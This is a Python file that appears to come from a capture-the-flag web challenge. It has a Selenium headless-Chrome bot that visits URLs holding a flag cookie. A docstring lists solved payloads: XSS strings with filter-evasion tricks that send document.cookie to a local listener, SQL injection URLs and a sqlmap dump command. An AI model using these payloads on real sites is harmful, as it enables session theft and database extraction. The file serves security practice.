import urllib.parse
import logging
import time
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--headless')
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument('--disable-setuid-sandbox')

log = logging.getLogger(__name__)

# export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES

'''
[xss_1] (title) remove script, document (FLAG FOUND!)
<img src=x onerror="this.onerror=null;this.src='http://127.0.0.1:8000/?c='+window['doc'+'ument'].cookie;">

[xss_2] (body) remove img, src, location (FLAG FOUND! w/ HTTPServer)
<script>document['locat'+'ion']="http://127.0.0.1:8000?c="+document.cookie;</script>

[xss_3] (img_src) remove onerror (lowercase only) (FLAG FOUND! w/HTTP)
<img src="/static/
x" onError="this['on'+'error']=null;this.src='http://127.0.0.1:8000/?c='+document.cookie;">
%78%22%20%6f%6e%45%72%72%6f%72%3d%22%74%68%69%73%5b%27%6f%6e%27%2b%27%65%72%72%6f%72%27%5d%3d%6e%75%6c%6c%3b%74%68%69%73%2e%73%72%63%3d%27%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%38%30%30%30%2f%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%22%3e

" onload="document.location='http://127.0.0.1:8000/?c='+document.cookie;">

[xss_4] (code_class) remove onerror (lowercase only)
"></code><img src=x onError="document.location='http://127.0.0.1:8000/?c='+document.cookie;"><code class="

[xss_5] (username)
<script>document.location="http://127.0.0.1:8000/?c="+document.cookie;</script>

[xss_6] (script_block) remove // and /* for commenting
'; img = new Image(); img.src = "http://127.0.0.1:8000/?c="+document.cookie;var foo = '


[sql_1]
http://127.0.0.1:4141/page/'OR'1'='1'LIMIT'2','1'--

[sql_2]
http://127.0.0.1:4141/page/char(27)%20OR%201=1%20LIMIT%202,1%20--

[sql_3]
http://127.0.0.1:4141/page/'%20oR%201=1%20LiMiT%202,%201%20--

[sql_4]
', '', (SELECT GROUP_CONCAT(content) from trash)) -- 

[sql_5]
http://127.0.0.1:4141/page/0x276f7220313d31206c696d697420322c312d2d

[sql_6]
sqlmap -u http://127.0.0.1:4141/page/5c7576dc-d9ed-4af3-96eb-e0caa33cc629?p=test --level=5 --risk=3 --dbms=mysql --technique=B --string="Password not found" --dump

'''


class Spooky(object):
    driver = None

    def __init__(self, cookie=None):
        if self.driver is None:

            # TODO: fix the phantomJS page rendering
            self.driver = webdriver.Chrome(chrome_options=chrome_options)
            self.driver.set_page_load_timeout(10)
            self.driver.set_window_size(1024, 768)

        if cookie:
            self.driver.get(cookie.get("domain"))
            cookie['domain'] = None # Clear the domain and use the current page
            self.driver.add_cookie(cookie)

    def __enter__(self):
        return self.driver

    def __exit__(self, type, value, traceback):
        self.driver.close()
        self.driver.quit()

    def get(self, url):
        self.driver.get(url)

    @staticmethod
    def make_cookie(domain, name, value, secure=False):
        ret = {'domain': domain, 'name': name, 'value': value, 'secure': secure}
        return ret


def check_alert(driver, flag):
    try:
        WebDriverWait(driver, 3).until(EC.alert_is_present(),'timed out waiting for alert')
        alert = driver.switch_to_alert()
        alert.accept()
        if flag in alert.getText():
            return True
        return False
    except Exception as e:
        return False


def xss_get(url, cookie_domain=None, cookie_name=None, cookie_value=None, user_agent=None):

    time.sleep(3)
    log.critical("xss_get(%s, %s, %s, %s, %s)" % (url, cookie_domain, cookie_name, cookie_value, user_agent))

    cookie = None
    if cookie_domain:
        base_url = urllib.parse.urlparse(cookie_domain)
        domain = "{}://{}".format(base_url.scheme, base_url.netloc)
        cookie = Spooky.make_cookie(domain, cookie_name, cookie_value)
        log.critical('Cookie: %s' % repr(cookie))

    with Spooky(cookie) as s:

        log.critical("HTTP GET {}".format(url))
        try:

            s.get(url)

            if check_alert(s, cookie_value):
                print('FLAG FOUND IN ALERT')
            elif cookie_value in s.page_source:
                print('FLAG FOUND!')
            else:
                print('FLAG NOT FOUND!')
                #print(s.page_source)

        except Exception as e:
            print('EXCEPTION OCCURRED')
            log.exception(repr(e))

        log.critical("Test complete.")


